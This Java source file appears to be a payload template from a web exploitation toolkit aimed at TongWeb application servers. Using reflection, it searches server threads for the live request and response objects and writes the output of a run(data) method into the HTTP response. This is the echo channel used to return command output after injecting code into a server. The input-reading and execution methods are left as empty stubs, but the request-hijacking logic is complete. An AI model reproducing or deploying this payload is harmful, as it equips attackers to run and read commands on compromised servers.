package com.reajason.javaweb.probe.payload.response;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Set;

public class TongWebWriter {
    public TongWebWriter() {
        try {
            Set<Thread> threads = Thread.getAllStackTraces().keySet();
            for (Thread thread : threads) {
                Object poller = getFieldValue(thread, "target");
                if (poller == null) {
                    continue;
                }
                String threadName = thread.getName();
                if (threadName.contains("Poller")  // TongWeb6
                        || threadName.contains("Acceptor") // TongWeb7
                ) {
                    try {
                        Object requestGroupInfo = getFieldValue(getFieldValue(getFieldValue(poller, "this$0"), "handler"), "global");
                        List<?> processors = (List<?>) getFieldValue(requestGroupInfo, "processors");
                        for (Object processor : processors) {
                            Object coyoteRequest = getFieldValue(processor, "req");
                            if (tryWriteRes(coyoteRequest)) {
                                return;
                            }
                        }
                    } catch (Exception x) {
                        // TongWeb 8
                        if (threadName.contains("Poller")) {
                            Set<?> keys = (Set<?>) getFieldValue(getFieldValue(poller, "selector"), "keys");
                            if (keys == null) {
                                continue;
                            }
                            for (Object key : keys) {
                                try {
                                    Object coyoteRequest = getFieldValue(getFieldValue(getFieldValue(key, "attachment"), "currentProcessor"), "request");
                                    if (tryWriteRes(coyoteRequest)) {
                                        return;
                                    }
                                } catch (Exception ignored) {
                                }
                            }
                        }
                    }
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private boolean tryWriteRes(Object coyoteRequest) throws Exception {
        Object request = invokeMethod(coyoteRequest, "getNote", new Class[]{Integer.TYPE}, new Object[]{1});
        Object response = invokeMethod(request, "getResponse", null, null);
        String data = getDataFromReq(request);
        if (data != null && !data.isEmpty()) {
            PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
            try {
                writer.write(run(data));
            } catch (Throwable e) {
                e.printStackTrace(writer);
            }
            writer.flush();
            writer.close();
            return true;
        }
        return false;
    }

    private String getDataFromReq(Object request) throws Exception {
        return null;
    }

    private String run(String data) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(obj.getClass() + " Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }
}
